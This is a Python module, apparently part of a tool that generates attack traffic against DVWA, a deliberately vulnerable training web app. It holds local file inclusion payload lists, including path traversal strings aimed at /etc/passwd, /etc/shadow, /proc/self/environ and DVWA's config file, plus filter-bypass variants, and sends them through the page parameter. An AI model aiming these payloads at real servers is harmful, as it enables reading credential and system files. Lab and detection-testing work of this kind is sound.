"""File Inclusion (LFI/RFI) attack against DVWA."""

import random
from .base import AttackModule, logger

LFI_PAYLOADS_LOW = [
    "../../../../../../etc/passwd",
    "../../../../../../etc/shadow",
    "../../../../../../etc/hosts",
    "../../../../../../proc/self/environ",
    "../../../../../../var/log/auth.log",
    "file:///etc/passwd",
    "/etc/passwd",
    "....//....//....//....//etc/passwd",
]

LFI_PAYLOADS_MEDIUM = [
    "....//....//....//....//etc/passwd",
    "..././..././..././etc/passwd",
    "/var/www/html/config/config.inc.php",
]

LFI_PAYLOADS_HIGH = [
    "file1.php",  # Valid pages to enumerate
    "file2.php",
    "file3.php",
    "file4.php",  # Might not exist
]


class FileInclusion(AttackModule):
    NAME = "file_inclusion"

    def _attack(self, session, payloads, count):
        for payload in random.sample(payloads, min(count, len(payloads))):
            session.get(
                "/vulnerabilities/fi/",
                params={"page": payload},
            )
            logger.debug("[file_inclusion] Path: %s", payload)

    def run_low(self, session):
        self._attack(session, LFI_PAYLOADS_LOW, random.randint(4, 6))

    def run_medium(self, session):
        self._attack(session, LFI_PAYLOADS_MEDIUM, 3)

    def run_high(self, session):
        self._attack(session, LFI_PAYLOADS_HIGH, 3)
